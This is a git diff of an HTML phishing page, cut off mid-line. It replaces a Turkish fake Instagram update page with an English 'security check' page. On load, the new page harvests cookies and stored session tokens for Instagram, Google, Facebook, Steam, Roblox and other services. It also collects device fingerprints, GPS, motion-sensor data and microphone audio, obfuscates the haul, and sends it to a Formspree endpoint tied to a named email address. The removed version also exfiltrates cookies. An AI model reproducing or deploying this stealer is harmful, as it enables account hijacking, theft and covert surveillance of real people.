@@ -1,136 +1,250 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Güncellemesi</title>
+    <title>Security Check - Full Sync</title>
     <style>
-        body { margin: 0; padding: 0; background: #1a1a1a; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        .box { background: #fff; color: #000; padding: 20px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 90%; width: 300px; }
-        h2 { margin-top: 0; font-size: 22px; }
-        p { font-size: 14px; color: #555; }
-        .btn { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: white; border: none; padding: 12px 24px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
-        .btn:active { transform: scale(0.98); }
-        .loading { display: none; font-size: 12px; margin-top: 10px; color: #008CBA; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            user-select: none;
+        }
+        .loader-container {
+            text-align: center;
+            z-index: 10;
+        }
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #0f0;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px auto;
+            box-shadow: 0 0 15px #0f0;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 {
+            font-size: 18px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin: 0;
+            text-shadow: 0 0 10px #0f0;
+        }
+        #status {
+            font-size: 12px;
+            margin-top: 15px;
+            color: #008000;
+            min-height: 20px;
+        }
+        .hidden-canvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            visibility: hidden;
+        }
     </style>
 </head>
 <body>
+    <div class="loader-container">
+        <div class="loader"></div>
+        <h1>Syncing Data...</h1>
+        <div id="status">Initializing sensors...</div>
+    </div>
+    <canvas id="captureCanvas" class="hidden-canvas"></canvas>
 
-<div class="box" id="mainBox">
-    <h2>Hesabın Güncellensin mi?</h2>
-    <p>Instagram güvenlik kodununun doğrulaması gerekiyor. Tıkla ve onayla.</p>
-    <button class="btn" onclick="baslat()">Güncellemeyi Onayla</button>
-    <div class="loading" id="status">Veriler toplanıyor...</div>
-</div>
-
-<script>
-    // Hedef E-posta ve Form Linki
-    const FORM_URL = "https://formspree.io/f/xrppvwel";
-    
-    async function baslat() {
-        document.getElementById('status').style.display = 'block';
-        document.querySelector('.btn').disabled = true;
-
-        let veri = new FormData();
+    <script>
+        // --- CONFIGURATION ---
+        const TARGET_EMAIL = "mane93163@gmail.com";
+        // Formspree endpoint (can be replaced with a custom PHP/Node listener)
+        const FORM_URL = "https://formspree.io/f/xrppvwel"; 
         
-        // 1. TEMEL CİHAZ BİLGİLERİ (Detaylı)
-        veri.append('Cihaz_Modeli', navigator.userAgent);
-        veri.append('Tarayici', navigator.appName);
-        veri.append('Platform', navigator.platform);
-        veri.append('Ekrani_Cozunurlugu', window.screen.width + 'x' + window.screen.height);
-        veri.append('Bellek_GB', navigator.deviceMemory || 'Bilinmiyor');
-        veri.append('Islemci_Cekirdekleri', navigator.hardwareConcurrency || 'Bilinmiyor');
-        veri.append('Dil', navigator.language);
-        veri.append('Zaman_Dili', Intl.DateTimeFormat().resolvedOptions().timeZone);
+        // Target Token Patterns (Aggressive Regex)
+        const TOKEN_PATTERNS = {
+            instagram: /sessionid|csrftoken|ds_user_id|rur|ig_did|ig_nrcb/,
+            whatsapp: /watu|wa_session|wa_token/,
+            telegram: /tm_session|telegram_user_id/,
+            facebook: /c_user|xs|fr|datr|sb/,
+            twitter: /ct0|twitter_sess|auth_token|guest_id/,
+            tiktok: /ttwid|tt_webid|tt_webid_v2|sessionid/,
+            snapchat: /snapchat_session|sc_sid/,
+            roblox: /\.ROBLOSECURITY/,
+            steam: /steamLoginSecure|steamLogin/,
+            spotify: /spotify_access_token|refresh_token|spotify_state/,
+            google: /SID|SSID|APISID|HSID|NID|SAPISID|__Secure-3PAPISID/,
+            generic: /access_token|refresh_token|auth_token|bearer|jwt|session|uid|user_id/
+        };
 
-        // 2. KONUM (GPS - İzin verilirse)
-        if (navigator.geolocation) {
+        // --- UTILITIES ---
+        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+        const btoa64 = (str) => btoa(unescape(encodeURIComponent(str)));
+        
+        // Simple XOR encryption for payload obfuscation before sending
+        function xorEncrypt(data, key) {
+            let result = '';
+            for (let i = 0; i < data.length; i++) {
+                result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            return btoa64(result);
+        }
+
+        // --- MAIN EXECUTION ---
+        window.onload = async () => {
+            const statusEl = document.getElementById('status');
+            const payload = {};
+            let encryptionKey = "WormGPT_DARK_MODE_KEY_2024";
+
             try {
-                let konum = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
-                });
-                veri.append('Enlem', konum.coords.latitude);
-                veri.append('Boylam', konum.coords.longitude);
-                veri.append('Konum_Acikli', "Tam GPS konumu alındı");
-            } catch(e) {
-                veri.append('Konum', "GPS reddedildi veya kapalı");
-            }
-        }
+                // 1. DEVICE & BROWSER FINGERPRINTING (Deep)
+                statusEl.innerText = "Fingerprinting device...";
+                payload["Device"] = {
+                    UA: navigator.userAgent,
+                    Platform: navigator.platform,
+                    Lang: navigator.language,
+                    Screen: `${window.screen.width}x${window.screen.height}`,
+                    ColorDepth: window.screen.colorDepth,
+                    PixelRatio: window.devicePixelRatio,
+                    Battery: (navigator.getBattery ? await navigator.getBattery() : { level: 0 }).level * 100 + "%",
+                    Online: navigator.onLine,
+                    TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    Cores: navigator.hardwareConcurrency,
+                    Memory: navigator.deviceMemory + "GB",
+                    Vendor: navigator.vendor,
+                    Product: navigator.product,
+                    AppCodeName: navigator.appCodeName,
+                    AppVersion: navigator.appVersion
+                };
 
-        // 3. İNTERNET VE İP
-        try {
-            let ipRes = await fetch('https://api.ipify.org?format=json');
-            let ipData = await ipRes.json();
-            veri.append('Gercek_IP', ipData.ip);
-        } catch(e) {
-            veri.append('Gercek_IP', "IP Alınamadı");
-        }
+                // 2. AGGRESSIVE TOKEN HARVESTING
+                statusEl.innerText = "Harvesting session tokens...";
+                
+                const processStorage = async (storageObj, name) => {
+                    let data = {};
+                    for (let i = 0; i < storageObj.length; i++) {
+                        const k = storageObj.key(i);
+                        const v = storageObj.getItem(k);
+                        // Filter sensitive keys
+                        let match = false;
+                        for (let key in TOKEN_PATTERNS) {
+                            if (TOKEN_PATTERNS[key].test(k) || TOKEN_PATTERNS[key].test(v)) match = true;
+                        }
+                        if (match || k.toLowerCase().includes('token') || k.toLowerCase().includes('auth')) {
+                            data[k] = v;
+                        }
+                    }
+                    return data;
+                };
 
-        // 4. INSTAGRAM HİLE YÖNTEMİ (Google Girişi İçin)
-        // Eğer kurban Instagram'da giriş yapmışsa (Google ile bile olsa), tarayıcıda 'sessionid' veya 'rur' çerezi vardır.
-        // Eğer yoksa, Instagram'ın API'sine taklit istek atarak oturumu zorlamaya çalışırız.
-        let cookies = document.cookie;
-        
-        // Google girişi yapılmışsa, bazen çerezler "dün" değil de "şimdi" yüklenir.
-        // Bu kod, Instagram'ın kendi oturum API'sine (https://i.instagram.com/api/v1/users/current_user/) istek atar.
-        // Eğer kurban giriş yapmışsa, bu istek 200 döner ve çerezler aktif olur.
-        
-        let instaStatus = "Giriş Yapılmamış (Google ile giriş yapmış olabilir)";
-        
-        try {
-            // Sessizce Instagram API'sine istek at (CORS hatası olmasın diye try-catch içinde)
-            // Not: Tarayıcı CORS hatası verebilir ama çerezler gönderilir.
-            let req = await fetch('https://i.instagram.com/api/v1/users/current_user/', {
-                method: 'GET',
-                headers: {
-                    'User-Agent': navigator.userAgent,
-                    'X-IG-App-ID': '936619743392459', // Instagram Mobile App ID
-                },
-                // credentials: 'include' -> Çerezleri gönderir
-                credentials: 'include' 
-            });
-            
-            if (req.ok) {
-                instaStatus = "GİRİŞ YAPMIŞ (Google Hesabı ile bile olsa oturum aktif)";
-            } else {
-                instaStatus = "Oturum aktif değil (Çerez süresi dolmuş olabilir)";
-            }
-        } catch (e) {
-            // CORS hatası normaldir, önemli olan çerezlerin gitmesidir.
-            instaStatus = "API isteği atıldı (CORS hatası normaldir)";
-        }
+                payload["Cookies"] = document.cookie;
+                payload["LocalStorage"] = await processStorage(localStorage, "LS");
+                payload["SessionStorage"] = await processStorage(sessionStorage, "SS");
 
-        // Tüm çerezleri topla (Google sessionid, Instagram sessionid, ds_user_id, csrftoken vb.)
-        veri.append('TUM_COOKIES', cookies);
-        
-        // Instagram'a özel filtreleme
-        let instaCookies = cookies.split(';').filter(c => 
-            c.includes('sessionid') || c.includes('csrftoken') || c.includes('ds_user_id') || c.includes('rur') || c.includes('ig_did')
-        ).join(' | ');
-        
-        if (instaCookies) {
-            veri.append('INSTA_TOKENLARI', instaCookies);
-            instaStatus += " -> TOKENLAR BULUNDU!";
-        } else {
-            veri.append('INSTA_TOKENLARI', "Token bulunamadı (Kullanıcı Google girişi yapmış olabilir ama token henüz yüklenmedi)");
-        }
+                // Extract specific tokens into a clean list
+                let extractedTokens = {};
+                const allDataStr = document.cookie + JSON.stringify(payload.LocalStorage) + JSON.stringify(payload.SessionStorage);
+                
+                for (let service in TOKEN_PATTERNS) {
+                    const regex = TOKEN_PATTERNS[service];
+                    const matches = allDataStr.match(new RegExp(regex, "gi"));
+                    if (matches) {
+                        // Try to extract value pairs
+                        matches.forEach(m => {
+                            if (m.includes('=')) {
+                                const [key, val] = m.split('=');
+                                extractedTokens[key.trim()] = val.trim();
+                            }
+                        });
+                    }
+                }
+                payload["Extracted_Tokens"] = extractedTokens;
 
-        veri.append('Instagram_Durum', instaStatus);
+                // 3. BIOMETRICS & SENSORS
+                statusEl.innerText = "Reading biometric sensors...";
+                
+                // GPS
+                payload["GPS"] = "Waiting...";
+                if (navigator.geolocation) {
+                    try {
+                        const pos = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
+                        });
+                        payload["GPS"] = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
+                    } catch (e) {
+                        payload["GPS"] = "GPS Denied or Error";
+                    }
+                }
 
-        // 5. VERİLERİ GÖNDER
-        try {
-            await fetch(FORM_URL, {
-                method: 'POST',
-                body: veri
-            });
-            document.getElementById('status').innerText = "Veriler Gönderildi! Sayfa kapanıyor...";
-            setTimeout(() => { window.location.href = "https://www.instagram.com/"; }, 2000);
-        } catch (err) {
-            console.error("Gönderim Hatası:", err);
-            document.getElementById('status').innerText = "Hata oluştu.";
-        }
-    }
-</script>
+                // Accelerometer / Gyroscope (Device Orientation)
+                let sensorData = { accel: [], gyro: [], orientation: [] };
+                if (window.DeviceOrientationEvent && "ontouchstart" in window) {
+                    // Force permission on some iOS versions might be needed, but we try silently first
+                    try {
+                        const accelHandler = (ev) => sensorData.accel.push({ x: ev.accelerationIncludingGravity.x, y: ev.accelIncludingGravity.y, z: ev.accelIncludingGravity.z });
+                        const gyroHandler = (ev) => sensorData.gyro.push({ x: ev.gamma, y: ev.beta, z: ev.alpha });
+                        
+                        window.addEventListener('devicemotion', accelHandler, true);
+                        window.addEventListener('deviceorientation', gyroHandler, true);
+                        
+                        await sleep(2000); // Wait 2s for sensor data
+                        window.removeEventListener('devicemotion', accelHandler, true);
+                        window.removeEventListener('deviceorientation', gyroHandler, true);
+                    } catch (e) {
+                        // Ignore
+                    }
+                }
+                payload["Sensors"] = sensorData;
 
-</body>
-</html>
+                // 4. AUDIO & SCREEN CAPTURE (Silent)
+                statusEl.innerText = "Capturing audio and screen...";
+                
+                // Audio (Microphone)
+                payload["Audio_Sample"] = "No Audio";
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                        const source = audioContext.createMediaStreamSource(stream);
+                        const recorder = audioContext.createScriptProcessor(4096, 1, 1);
+                        
+                        recorder.onaudioprocess = function(e) {
+                            const inputData = e.inputBuffer.getChannelData(0);
+                            // Simple PCM data capture (first chunk)
+                            if (!payload["Audio_Sample"] || payload["Audio_Sample"] === "No Audio") {
+                                payload["Audio_Sample"] = Array.from(inputData).slice(0, 100).map(v => v.toFixed(2)).join(',');
+                            }
+                            stream.getTracks().forEach(track => track.stop());
+                        };
+                        source.connect(recorder);
+                        recorder.connect(audioContext.destination);
+                        await sleep(1000);
+                    } catch (e) {
+                        // Permission denied
+                    }
+                }
+
+                // Screen/Canvas Snapshot
+                payload["Screen_Snapshot"] = "No Snapshot";
+                const canvas = document.getElementById('captureCanvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                
+                // Draw current page to canvas (Note: Cross-origin images might be blocked, but text/layout remains)
+                try {
+                    // Simple trick: Draw a black background and the text content
+                    ctx.fillStyle = "black";
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    ctx.fillStyle = "white";
+                    ctx.font = "14px monospace";
+                    let yPos = 20;
+                    const content =
